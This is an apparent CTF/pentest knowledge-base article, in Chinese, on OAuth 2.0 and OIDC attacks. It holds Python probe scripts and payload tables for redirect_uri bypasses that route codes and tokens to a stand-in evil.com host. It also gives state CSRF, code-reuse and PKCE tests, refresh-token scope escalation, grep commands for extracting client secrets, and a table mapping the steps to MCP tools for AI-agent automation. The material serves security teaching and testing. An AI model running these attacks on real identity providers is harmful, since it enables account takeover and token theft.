---
id: "ctf-website/02-auth/oauth-sso"
title: "OAuth 2.0 / OIDC 攻击实战"
title_en: "OAuth 2.0 / OIDC Attack Techniques"
summary: >
  全面覆盖 OAuth 2.0 和 OpenID Connect 流程中的九大攻击面：redirect_uri 开放重定向、state/nonce CSRF、code 复用、邮箱关联账户劫持、PKCE 缺失、ID Token 混淆、Implicit Flow 攻击、Client Secret 提取及 Device Code Flow 滥用。
summary_en: >
  A comprehensive guide to nine OAuth 2.0 / OIDC attack surfaces: redirect_uri open redirect, state/nonce CSRF, authorization code reuse, email-based account hijacking, missing PKCE, ID Token confusion, Implicit Flow attacks, Client Secret extraction, and Device Code Flow abuse.
board: "ctf-website"
category: "02-auth"
signals: ["OAuth", "OIDC", "redirect_uri", "state", "PKCE", "code reuse", "ID Token", "client_secret", "SSO"]
mcp_tools: ["http_probe", "kb_router", "kb_read_file"]
keywords: ["OAuth攻击", "OIDC", "SSO", "redirect_uri绕过", "PKCE", "code复用", "client secret", "CSRF", "token混淆"]
difficulty: "advanced"
tags: ["authentication", "oauth", "oidc", "sso", "web-security", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# OAuth 2.0 / OIDC 攻击实战

## 攻击面

```
OAuth 流程四阶段，每阶段都有攻击点:

  Client ──▶ /authorize ──▶ /token ──▶ /userinfo ──▶ API
              │   ▲           │  ▲        │  ▲
              │ redirect_uri  │ code      │  ID Token
              │ state/nonce   │ reuse     │  aud 缺失
              │ PKCE          │           │
```

## 1. redirect_uri 攻击

```python
# 探测 redirect_uri 验证逻辑
import requests

TARGET = "https://target.com/oauth/authorize"
CLIENT_ID = "from_app_registration"

PAYLOADS = [
    # 基础开放重定向
    "https://evil.com/callback",
    # 子域名欺骗
    "https://target.com.evil.com/callback",
    # 协议相对
    "//evil.com/callback",
    # userinfo 混淆
    "https://target.com@evil.com/callback",
    # 未注册但同域的路径
    "https://target.com/other-app/callback",
    # 参数污染 (两个 redirect_uri)
    "https://legit.com/callback&redirect_uri=https://evil.com/callback",
    # fragment 混淆
    "https://legit.com/callback#@evil.com/callback",
    # 开放重定向链
    "https://legit.com/callback?next=https://evil.com",
]

for uri in PAYLOADS:
    params = {
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": uri,
        "scope": "openid profile email",
        "state": "x"
    }
    r = requests.get(TARGET, params=params, allow_redirects=False)
    if r.status_code in (301, 302):
        loc = r.headers.get("Location", "")
        if "evil.com" in loc:
            print(f"[!] BYPASS: {uri} → {loc}")
    elif "invalid" not in r.text.lower():
        print(f"[?] UNKNOWN: {uri} → {r.status_code}")
```

### 1.1 redirect_uri 规范化矩阵

| 变体 | Payload | 目标差异 |
|---|---|---|
| 子域混淆 | `https://target.com.evil.com/cb` | `startswith("https://target.com")` |
| UserInfo | `https://target.com@evil.com/cb` | parser 取 host 不一致 |
| Fragment | `https://target.com/cb#@evil.com` | 校验含 fragment，下游丢 fragment |
| Path traversal | `https://target.com/oauth/cb/../evil` | normalize 前后路径不同 |
| 双编码 | `https://target.com%252fevil.com/cb` | decode 次数不同 |
| 参数污染 | `redirect_uri=legit&redirect_uri=evil` | IdP/SP 取首尾不同 |
| Open redirect | `https://target.com/redirect?next=https://evil.com` | 白名单只看第一跳 |
| Scheme 降级 | `http://target.com/cb` | code/token 经明文跳转 |

命中判断：看最终 `Location` 里 `code`、`token`、`state` 是否进入攻击者域；如果只跳到登录页，说明 authorize 还没完成，需带有效 session 再测。

### 1.2 授权请求字段绑定

| 字段 | 必须绑定对象 | 可测错配 |
|---|---|---|
| `code` | client_id + redirect_uri + session + PKCE | 换 client/token endpoint 复用 |
| `state` | 浏览器 session | 固定值/空值/跨 session |
| `nonce` | id_token + session | 重放 id_token |
| `code_challenge` | authorization code | 不带 verifier 换 token |
| `aud` | client_id/API | ID Token 调 API |
| `iss` | IdP | 邮箱同名跨 IdP 绑定 |
| `sub` | IdP 内稳定用户 ID | 只按 email 绑定 |

## 2. state/nonce 缺失 → CSRF

```python
# 如果没有 state 或 state 可预测:
# 攻击者先用自己的账号完成 OAuth，拿到 code
# 然后诱导受害者访问:
#   https://target.com/oauth/callback?code=ATTACKER_CODE&state=KNOWN
# 受害者浏览器发起请求 → 服务端把攻击者的 code 换成 access_token
# → 受害者浏览器存储攻击者的 token → 受害者以攻击者身份操作
# 攻击者再读自己账号下的内容 → 可能看到受害者误传的数据

# 检测脚本
def test_state_csrf(auth_url: str, client_id: str, redirect_uri: str):
    # 步骤 1: 不传 state
    r1 = requests.get(auth_url, params={
        "response_type": "code", "client_id": client_id,
        "redirect_uri": redirect_uri
    }, allow_redirects=False)
    if r1.status_code in (301, 302):
        print("[i] No state required — CSRF possible")

    # 步骤 2: state 可预测? (如: 固定值, 递增数字, base64(时间戳))
    for guess in ["1", "state", "ok", "true", "test", "x"]:
        r2 = requests.get(auth_url, params={
            "response_type": "code", "client_id": client_id,
            "redirect_uri": redirect_uri, "state": guess
        })
        if "invalid" not in r2.text.lower():
            print(f"[!] Predictable state: {guess}")
```

## 3. code 复用

```python
# 如果同一个 authorization code 可以被不同用户使用:
#   → code 没有绑定 session/client
# 测试方法:
# 1. 用账号 A 拿到 code
# 2. 清空 cookie，换 IP
# 3. 用账号 B 的 session 去 /token 换 token
# 4. 如果换成功 → code 未绑定 client

def test_code_reuse(token_url: str, code: str, client_id: str, redirect_uri: str):
    # 第一次: 正常换取 token
    r1 = requests.post(token_url, data={
        "grant_type": "authorization_code", "code": code,
        "client_id": client_id, "redirect_uri": redirect_uri
    })
    assert r1.status_code == 200, "First exchange failed"
    token1 = r1.json().get("access_token")

    # 第二次: 相同的 code 再次换取
    r2 = requests.post(token_url, data={
        "grant_type": "authorization_code", "code": code,
        "client_id": client_id, "redirect_uri": redirect_uri
    })
    if r2.status_code == 200:
        print("[!] Code reuse possible!")
```

## 4. 邮箱关联账号劫持

```python
# 场景: 系统允许 Google/Facebook/GitHub 登录
# 如果登录逻辑是: 查邮箱 → 有则绑定账号
# 而没有验证 iss (签发者):

# 攻击:
# 1. 在 IdP-A (如 GitHub) 注册 target@company.com 邮箱
#    (GitHub 不验证邮箱所有权)
# 2. 用 GitHub OAuth 登录 → 系统查到 target@company.com
#    已有关联账号 → 绑定成功 → 登录为目标用户

# 实战判断: 如果只按 email 绑定账号，而不校验 iss/sub/email_verified，
# 同邮箱或同名邮箱场景就可能产生账号错绑。
```

## 5. PKCE 缺失

```python
# 如果没有 PKCE (Proof Key for Code Exchange):
# 恶意应用可以拦截 authorization code

# 检测: 看 /authorize 是否需要 code_challenge 参数
r = requests.get("https://target.com/oauth/authorize", params={
    "response_type": "code", "client_id": "public_client_id",
    "redirect_uri": "app://callback",
    "code_challenge": "invalid_challenge",
    "code_challenge_method": "S256"
})
# 如果返回 200 且不带 code_challenge 也能拿到 code → PKCE 非强制
```

### 5.1 PKCE 交换脚本

```python
import base64
import hashlib
import os

def pkce_pair():
    verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
    challenge = base64.urlsafe_b64encode(
        hashlib.sha256(verifier.encode()).digest()
    ).rstrip(b"=").decode()
    return verifier, challenge

verifier, challenge = pkce_pair()
print("code_verifier =", verifier)
print("code_challenge =", challenge)
```

错配实验：

```text
1. authorize 带 code_challenge=A，token 不带 code_verifier
2. authorize 带 code_challenge=A，token 带 code_verifier=B
3. authorize 不带 code_challenge，token 带任意 verifier
4. 两个浏览器 session 交换 code/code_verifier
```

命中样本：错误 verifier 仍返回 access_token；或 code 能被另一个 session/client 换 token。

## 6. ID Token 当 Access Token

```python
# 抓取 OIDC 流程中的 id_token
# 尝试用 id_token 调用 API:
resp = requests.get("https://target.com/api/user/profile",
    headers={"Authorization": f"Bearer {id_token}"})
# 如果 200 → ID Token 被当作 Access Token 接受
# 可能绕过 scope 限制 (ID Token 不包含 scope claim)
```

### 6.1 Token Oracle 矩阵

同一个 token 要打多个 API oracle，不要只看 `/me`：

| Oracle | 目标 | 成功信号 |
|---|---|---|
| `/userinfo` | access_token 是否被 IdP 接受 | 返回 sub/email |
| `/api/me` | Resource server 是否验 `aud` | 返回当前用户 |
| `/api/admin` | scope/role 是否生效 | 403→200 或数据变化 |
| GraphQL | Bearer 是否进入 resolver | `viewer`/`me` 字段 |
| WebSocket | token 是否可握手 | `connection_ack` |

```python
import requests

def token_oracle(token, endpoints):
    for name, url in endpoints.items():
        r = requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=8)
        print(name, r.status_code, r.text[:180])
```

## 7. Implicit Flow 攻击

```python
# Implicit Flow 直接在 URL fragment 中返回 access_token
# https://target.com/callback#access_token=xxx&token_type=bearer

# 攻击面:
# 1. Referer 泄露 token (fragment 可能在 Referer 中)
# 2. history 窃取
# 3. 如果没验证 redirect_uri → 直接拿 token

# 强制 implicit flow (如果 authorization_code 受限)
def force_implicit(client_id: str, redirect_uri: str):
    return requests.get("https://target.com/oauth/authorize", params={
        "response_type": "token",      # ← implicit 模式
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": "openid profile admin",
        "state": "x"
    })
```

## 8. Client Secret 提取

```bash
# 常见泄露位置:
# 1. JS 源码硬编码
grep -r "client_secret\|clientSecret\|CLIENT_SECRET" --include="*.js" .
# 2. 移动端 APK 反编译
strings app.apk | grep -i "client_secret\|secret"
# 3. Source maps / .map 文件
# 4. Public config endpoints: /config, /env, /.env
# 5. Git 历史
git log -p | grep -i "client_secret"

# 拿到 client_secret 后 → 可进行 confidential client 的所有操作
```

## 9. Device Code Flow 滥用

```python
# Device Code Flow (设备授权) — 适用于 TV/IoT
# 如果未限制 device_code 速率:
# 1. 持续尝试 user_code → 可能暴力猜解
# 2. 短间隔轮询 → 等待用户输入后立即换取 token
# https://target.com/oauth/device/code
```

### 9.1 Refresh Token / Scope 变形

```bash
# scope 扩权尝试
curl -X POST "$TOKEN" \
  -d "grant_type=refresh_token&refresh_token=$RT&client_id=$CID&scope=openid profile email admin offline_access"

# client 混用
curl -X POST "$TOKEN" \
  -d "grant_type=refresh_token&refresh_token=$RT&client_id=other_client"
```

判断点：

- 新 access_token 的 `scope` 是否比原 token 多。
- refresh_token 是否可跨 client 使用。
- `azp`、`aud`、`iss` 是否和当前 API 匹配。
- refresh 后旧 access_token 是否仍可用。

## 工具命令

```bash
# 完整 OAuth 流程抓取
curl -v "https://target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://callback&scope=openid%20profile&state=x"
curl -X POST "https://target.com/oauth/token" -d "grant_type=authorization_code&code=xxx&client_id=xxx&redirect_uri=https://callback"
curl -X POST "https://target.com/oauth/token" -d "grant_type=refresh_token&refresh_token=xxx&client_id=xxx"
curl -X POST "https://target.com/oauth/token" -d "grant_type=client_credentials&client_id=xxx&client_secret=xxx"
python3 jwt_tool.py <id_token>
curl https://target.com/.well-known/openid-configuration | jq .
```

## Evidence

记录: 完整流程每个 HTTP 请求/响应、authorize 参数、redirect_uri payload、code 与 token 交换结果、PKCE verifier/challenge、id_token/access_token/refresh_token 的 claims、client_secret 来源、token 能访问的 API 和失败样本。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| OAuth endpoint 探测 | `http_probe` | HTTP GET 探测 OAuth/SSO 端点 |
| 知识检索 | `kb_router` | 按攻击信号搜索知识库相关技术 |
| 知识库文件读取 | `kb_read_file` | 读取知识库技术文件内容 |

## 工作流

建立 baseline → 抓完整 authorize/token/userinfo/API 请求 → 确认字段绑定关系 → 对 redirect_uri/state/nonce/PKCE/aud/iss 做单变量错配 → 用 token oracle 验证权限变化 → 保存成功样本和失败样本。
